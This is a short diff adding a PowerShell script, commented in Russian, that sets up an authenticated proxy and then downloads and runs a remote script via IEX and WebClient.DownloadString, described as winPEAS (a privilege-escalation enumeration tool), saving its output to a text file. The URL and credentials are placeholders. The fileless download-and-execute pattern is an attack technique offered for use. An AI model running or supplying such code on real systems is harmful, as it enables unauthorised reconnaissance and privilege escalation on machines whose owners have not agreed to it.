@@ -1,0 +1,12 @@
+# Настройка прокси
+$proxyAddress = "http://your-proxy-address:port"
+$proxyUsername = "username"
+$proxyPassword = "password" | ConvertTo-SecureString -AsPlainText -Force
+$proxyCred = New-Object System.Management.Automation.PSCredential($proxyUsername, $proxyPassword)
+
+# Скачивание и запуск winPEAS с сохранением вывода в файл
+$webClient = New-Object System.Net.WebClient
+$webClient.Proxy = New-Object System.Net.WebProxy($proxyAddress, $true)
+$webClient.Proxy.Credentials = $proxyCred.GetNetworkCredential()
+$scriptOutput = IEX $webClient.DownloadString('https://raw.githubusercontent.com/add_what_you_want.ps1')
+$scriptOutput | Out-File -FilePath "winpeas_output.txt" -Encoding utf8
